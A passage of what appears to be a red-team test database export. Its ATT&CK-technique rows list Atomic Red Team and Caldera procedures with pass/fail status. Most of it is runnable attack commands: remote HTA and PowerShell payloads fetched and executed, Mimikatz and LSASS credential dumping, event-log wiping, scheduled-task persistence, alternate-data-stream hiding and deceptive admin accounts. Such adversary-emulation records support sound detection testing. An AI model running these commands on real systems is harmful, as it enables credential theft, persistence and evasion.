"file_name": "", "pre_command": [], "ability_name": "Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "file_url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.txt\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallLog\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallState\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\" -ErrorAction Ignore\\n", "command": ["mshta vbscript:Execute(\\"CreateObject(\\"\\"Wscript.Shell\\"\\").Run \\"\\"powershell -noexit -file PathToAtomicsFolder\\\\T1218.005\\\\src\\\\powershell.ps1\\"\\":close\\")\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Mshta executes VBScript to execute malicious command", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["$var =Invoke-WebRequest \\"#{hta_url}\\"\\n$var.content|out-file \\"#{temp_file}\\"\\nmshta \\"#{temp_file}\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Mshta Executes Remote HTML Application (HTA)", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "temp_file", "value": "$env:appdata\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1218.005.hta"}, {"key": "hta_url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "script_engine", "value": "JScript"}, {"key": "hta_file_path", "value": "Test.hta"}, {"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Jscript Engine Simulating Double Click", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "script_engine", "value": "JScript"}, {"key": "hta_file_path", "value": "Test.hta"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Direct download from URI", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}, {"key": "hta_uri", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "rundll32_file_path", "value": "$env:windir\\\\system32\\\\rundll32.exe"}, {"key": "script_engine", "value": "JScript"}, {"key": "protocol_handler", "value": "About"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - JScript Engine with Inline Protocol Handler", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}, {"key": "script_engine", "value": "JScript"}, {"key": "protocol_handler", "value": "About"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Simulate Lateral Movement over UNC Path", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}], "execution_status": "Pass"}]}}}}
330	\N	\N	\N	no	Test comment readded, 2nd comment added	\N	2021-09-01 04:49:31.194929+00	T1007	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "cleaned daata", "command": ["command"], "executor": ["psh"], "platform": "Windows", "file_name": "", "pre_command": [], "ability_name": "", "created_date": "01/09/2021", "post_command": [], "modified_date": "01/09/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}], "caldera": [{"cleanup": "NA", "command": ["Powershell.exe \\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\\\Windows\\\\System32\\\\cmd.exe'\\""], "executor": "cmd", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Command and Scripting Interpreter: PowerShell", "created_date": "01/09/2021", "post_command": [], "modified_date": "01/09/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}], "atomicred": [{"cleanup": "NA", "command": ["wevtutil cl #{log_name}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Clear Logs", "created_date": "01/09/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "log_name", "value": "System"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["$logs = Get-EventLog -List | ForEach-Object {$_.Log}\\n$logs | ForEach-Object {Clear-EventLog -LogName $_ }\\nGet-EventLog -list\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete System Logs Using Clear-EventLog", "created_date": "01/09/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["IEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing)\\nInvoke-Maldoc -macroFile \\"PathToAtomicsFolder\\\\T1070.001\\\\src\\\\T1070.001-macrocode.txt\\" -officeProduct \\"Word\\" -sub \\"ClearLogs\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Clear Event Logs via VBA", "created_date": "01/09/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  New-Object -COMObject \\"Word.Application\\" | Out-Null\\n  Stop-Process -Name \\"winword\\"\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "cleaned data", "command": ["command"], "executor": ["psh", "pwsh"], "platform": "Windows", "file_name": "", "pre_command": [], "ability_name": "", "created_date": "01/09/2021", "post_command": [], "modified_date": "01/09/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["schtasks /create /tn \\"T1053_005_OnLogon\\" /sc onlogon /tr \\"cmd.exe /c calc.exe\\"\\nschtasks /create /tn \\"T1053_005_OnStartup\\" /sc onstart /ru system /tr \\"cmd.exe /c calc.exe\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Scheduled Task Startup Script", "created_date": "01/09/2021", "post_command": [], "modified_date": "01/09/2021", "pre-requisite": [], "input_arguments": [], "execution_status": ""}, {"cleanup": "NA", "command": ["SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Scheduled task Local", "created_date": "01/09/2021", "post_command": [], "modified_date": "01/09/2021", "pre-requisite": [], "input_arguments": [{"key": "task_command", "value": "C:\\\\windows\\\\system32\\\\cmd.exe"}, {"key": "time", "value": 1210}], "execution_status": ""}, {"cleanup": "NA", "command": ["SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \\"Atomic task\\" /TR \\"#{task_command}\\" /SC daily /ST #{time}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Scheduled task Remote", "created_date": "01/09/2021", "post_command": [], "modified_date": "01/09/2021", "pre-requisite": [], "input_arguments": [{"key": "task_command", "value": "C:\\\\windows\\\\system32\\\\cmd.exe"}, {"key": "time", "value": 1210}, {"key": "target", "value": "localhost"}, {"key": "user_name", "value": "DOMAIN\\\\user"}, {"key": "password", "value": "At0micStrong"}], "execution_status": ""}, {"cleanup": "NA", "command": ["$Action = New-ScheduledTaskAction -Execute \\"calc.exe\\"\\n$Trigger = New-ScheduledTaskTrigger -AtLogon\\n$User = New-ScheduledTaskPrincipal -GroupId \\"BUILTIN\\\\Administrators\\" -RunLevel Highest\\n$Set = New-ScheduledTaskSettingsSet\\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\\nRegister-ScheduledTask AtomicTask -InputObject $object\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Powershell Cmdlet Scheduled Task", "created_date": "01/09/2021", "post_command": [], "modified_date": "01/09/2021", "pre-requisite": [], "input_arguments": [], "execution_status": ""}, {"cleanup": "NA", "command": ["IEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing) \\nInvoke-MalDoc -macroFile \\"PathToAtomicsFolder\\\\T1053.005\\\\src\\\\T1053.005-macrocode.txt\\" -officeProduct \\"#{ms_product}\\" -sub \\"Scheduler\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Task Scheduler via VBA", "created_date": "01/09/2021", "post_command": [], "modified_date": "01/09/2021", "pre-requisite": ["try {\\n  New-Object -COMObject \\"#{ms_product}.Application\\" | Out-Null\\n  $process = \\"#{ms_product}\\"; if ( $process -eq \\"Word\\") {$process = \\"winword\\"}\\n  Stop-Process -Name $process\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [{"key": "ms_product", "value": "Word"}], "execution_status": ""}, {"cleanup": "NA", "command": ["$xml = [System.IO.File]::ReadAllText(\\"PathToAtomicsFolder\\\\T1053.005\\\\src\\\\T1053_005_WMI.xml\\")\\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \\"Root\\\\Microsoft\\\\Windows\\\\TaskScheduler\\" -MethodName \\"RegisterByXml\\" -Arguments @{ Force = $true; Xml =$xml; }\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "WMI Invoke-CimMethod Scheduled Task", "created_date": "01/09/2021", "post_command": [], "modified_date": "01/09/2021", "pre-requisite": [], "input_arguments": [], "execution_status": ""}]}}}}
32	\N		reg	yes	P1	\N	2021-07-27 11:38:52.985241+00	T1003.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Run below command.\\nagent_id> mimikatz"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.478Z", "pre-requisite": [], "pre-requistes": "1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "", "command": ["Windows Registry Editor Version 5.00\\n\\n[HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa]\\n\\"Security Packages\\"=hex(7):73,00,70,00,6f,00,74,00,6c,00,65,00,73,00,73,00,2e,\\\\\\n  00,64,00,6c,00,6c,00,00,00,00,00\\n  \\n[HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\OSConfig]\\n\\"Security Packages\\"=hex(7):73,00,70,00,6f,00,74,00,6c,00,65,00,73,00,73,00,2e,\\\\\\n  00,64,00,6c,00,6c,00,00,00,00,00"], "executor": [""], "platform": "", "file_name": "T1003_001.reg", "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.171Z", "pre-requisite": [], "pre-requistes": "1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "del \\"#{output_file}\\" >nul 2>&1", "command": ["#{wce_exe} -o #{output_file}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows Credential Editor", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": ["if (Test-Path #{wce_exe}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "output_file", "value": "%temp%\\\\wce-output.txt"}, {"key": "wce_zip_hash", "value": "8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933"}, {"key": "wce_exe", "value": "PathToAtomicsFolder\\\\T1003.001\\\\bin\\\\wce.exe"}, {"key": "wce_url", "value": "https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip"}], "execution_status": "Fail"}, {"cleanup": "del \\"#{output_file}\\" >nul 2> nul\\n", "command": ["#{procdump_exe} -accepteula -ma lsass.exe #{output_file}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Dump LSASS.exe Memory using ProcDump", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": ["if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "output_file", "value": "C:\\\\Windows\\\\Temp\\\\lsass_dump.dmp"}, {"key": "procdump_exe", "value": "PathToAtomicsFolder\\\\T1003.001\\\\bin\\\\procdump.exe"}], "execution_status": "Fail"}, {"cleanup": "Remove-Item $env:TEMP\\\\lsass-comsvcs.dmp -ErrorAction Ignore\\n", "command": ["C:\\\\Windows\\\\System32\\\\rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll", " MiniDump (Get-Process lsass).id $env:TEMP\\\\lsass-comsvcs.dmp full\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Dump LSASS.exe Memory using comsvcs.dll", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Fail"}, {"cleanup": "del C:\\\\windows\\\\temp\\\\dumpert.dmp >nul 2> nul\\n", "command": ["#{dumpert_exe}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Dump LSASS.exe Memory using direct system calls and API unhooking", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": ["if (Test-Path #{dumpert_exe}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "dumpert_exe", "value": "PathToAtomicsFolder\\\\T1003.001\\\\bin\\\\Outflank-Dumpert.exe"}], "execution_status": "Fail"}, {"cleanup": "del C:\\\\windows\\\\temp\\\\dumpert.dmp >nul 2> nul\\n", "command": ["#{dumpert_exe}\\n"], "executor": "manual", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Dump LSASS.exe Memory using Windows Task Manager", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Fail"}, {"cleanup": "del C:\\\\windows\\\\temp\\\\dumpert.dmp >nul 2> nul\\n", "command": ["#{mimikatz_exe} \\"sekurlsa::minidump #{input_file}\\" \\"sekurlsa::logonpasswords full\\" exit\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Offline Credential Theft With Mimikatz", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": ["cmd /c \\"if not exist #{input_file} (exit /b 1)\\"\\n"], "input_arguments": [{"key": "input_file", "value": "%tmp%\\\\lsass.DMP"}, {"key": "mimikatz_exe", "value": "PathToAtomicsFolder\\\\T1003.001\\\\bin\\\\mimikatz.exe"}], "execution_status": "Fail"}, {"cleanup": "del C:\\\\windows\\\\temp\\\\dumpert.dmp >nul 2> nul\\n", "command": ["pypykatz live lsa\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "LSASS read with pypykatz", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": ["pypykatz -h >nul 2>&1\\nexit /b %errorlevel%\\n"], "input_arguments": [], "execution_status": "Fail"}, {"cleanup": "Remove-Item $env:TEMP\\\\lsass_*.dmp -ErrorAction Ignore\\n", "command": ["IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); get-process lsass | Out-Minidump\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Dump LSASS.exe Memory using Out-Minidump.ps1", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Fail"}, {"cleanup": "del \\"#{output_file}\\" >nul 2> nul\\n", "command": ["#{procdump_exe} -accepteula -mm lsass.exe #{output_file}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create Mini Dump of LSASS.exe using ProcDump", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": ["if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "output_file", "value": "C:\\\\Windows\\\\Temp\\\\lsass_dump.dmp"}, {"key": "procdump_exe", "value": "PathToAtomicsFolder\\\\T1003.001\\\\bin\\\\procdump.exe"}], "execution_status": "Fail"}, {"cleanup": "del \\"#{output_file}\\" >nul 2> nul\\n", "command": ["IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Powershell Mimikatz", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": [], "input_arguments": [{"key": "remote_script", "value": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"}], "execution_status": "Fail"}, {"cleanup": "del #{output_file}\\n", "command": ["echo \\"Createdump Path #{createdump_exe}\\"\\n$LSASS = tasklist | findstr \\"lsass\\"\\n$FIELDS = $LSASS -split \\"\\\\s+\\"\\n$ID = $FIELDS[1]\\n& \\"#{createdump_exe}\\" -u -f #{output_file} $ID\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Dump LSASS with .Net 5 createdump.exe", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": ["if (Test-Path '#{createdump_exe}') {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "output_file", "value": "C:\\\\Windows\\\\Temp\\\\dotnet-lsass.dmp"}, {"key": "createdump_exe", "value": "C:\\\\Program Files\\\\dotnet\\\\shared\\\\Microsoft.NETCore.App\\\\5.*.*\\\\createdump.exe"}], "execution_status": "Fail"}]}}}}
314	\N		\N	yes	P2	\N	2021-07-30 02:51:16.900977+00	T1137	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["cd ~/Library/Cookies\\ngrep -q \\"#{search_string}\\" \\"Cookies.binarycookies\\"\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Search macOS Safari Cookies", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "search_string", "value": "coinbase"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["#{lazagne_path} browsers\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "LaZagne - Credentials from Browser", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{lazagne_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "lazagne_path", "value": "PathToAtomicsFolder\\\\T1555.003\\\\bin\\\\LaZagne.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["security -h\\nsecurity find-certificate -a -p > #{cert_export}\\nsecurity import #{cert_export} -k\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Keychain", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "cert_export", "value": "/tmp/certs.pem"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Start-Process #{powershell_command}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Hidden Window", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_command", "value": "powershell.exe -WindowStyle hidden calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["type C:\\\\temp\\\\evil.exe > \\"C:\\\\Program Files (x86)\\\\TeamViewer\\\\TeamViewer12_Logfile.log:evil.exe\\"\\nextrac32 #{path}\\\\procexp.cab #{path}\\\\file.txt:procexp.exe\\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\\\procexp.exe > #{path}\\\\file.txt:procexp.exe\\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\\\temp:ttt\\nmakecab #{path}\\\\autoruns.exe #{path}\\\\cabtest.txt:autoruns.cab\\nprint /D:#{path}\\\\file.txt:autoruns.exe #{path}\\\\Autoruns.exe\\nreg export HKLM\\\\SOFTWARE\\\\Microsoft\\\\Evilreg #{path}\\\\file.txt:evilreg.reg\\nregedit /E #{path}\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\\\MyCustomRegKey\\nexpand \\\\\\\\webdav\\\\folder\\\\file.bat #{path}\\\\file.txt:file.bat\\nesentutl.exe /y #{path}\\\\autoruns.exe /d #{path}\\\\file.txt:autoruns.exe /o \\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Alternate Data Streams (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "path", "value": "c:\\\\ADS\\\\"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"#{ads_file_path}\\" -Force -ErrorAction Ignore\\n", "command": ["if (!(Test-Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki -PathType Container)) {\\n    New-Item -ItemType Directory -Force -Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\n    }\\nStart-Process -FilePath \\"$env:comspec\\" -ArgumentList \\"/c", "type", "#{payload_path}", ">", "`\\"#{ads_file_path}:#{ads_name}`\\"\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Store file in Alternate Data Stream (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "payload_path", "value": "c:\\\\windows\\\\system32\\\\cmd.exe"}, {"key": "ads_file_path", "value": "C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\\\desktop.ini"}, {"key": "ads_name", "value": "desktop.ini"}], "execution_status": "Pass"}, {"cleanup": "del #{file_name} >nul 2>&1\\n", "command": ["echo cmd /c echo \\"Shell code execution.\\"> #{file_name}:#{ads_filename}\\nfor /f \\"usebackq delims=?\\" %i in (#{file_name}:#{ads_filename}) do %i\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS command prompt", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "file_name", "value": "%temp%\\\\T1564.004_has_ads_cmd.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path #{file_name} -ErrorAction Ignore\\n", "command": ["echo \\"test\\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \\"test\\"\\nset-content -path #{file_name} -stream #{ads_filename} -value \\"test2\\"\\nset-content -path . -stream #{ads_filename} -value \\"test3\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{file_name}) { exit 0 } else { exit 1 }\\n"], "input_arguments": [{"key": "file_name", "value": "$env:TEMP\\\\T1564.004_has_ads_powershell.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"$env:TEMP\\\\extracted.exe\\" -ErrorAction Ignore\\n", "command": ["$macro = [System.IO.File]::ReadAllText(\\"PathToAtomicsFolder\\\\T1564\\\\src\\\\T1564-macrocode.txt\\")\\n$macro = $macro -replace \\"aREPLACEMEa\\"", " \\"PathToAtomicsFolder\\\\T1564\\\\bin\\\\extractme.bin\\"\\nIEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing)\\nInvoke-Maldoc -macroCode \\"$macro\\" -officeProduct \\"Word\\" -sub \\"Extract\\" -NoWrap\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Extract binary files via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  New-Object -COMObject \\"Word.Application\\" | Out-Null\\n  Stop-Process -Name \\"winword\\"\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "net user $ /DELETE 2>&1", "command": ["net user $ ATOMIC123! /add /active:yes"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create a user called \\"$\\" as noted here", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-LocalUser -Name \\"Administrator \\" 2>&1 | out-null", "command": ["New-LocalUser -Name \\"Administrator \\" -NoPassword"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create an \\"Administrator \\" user (with a space on the end)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], 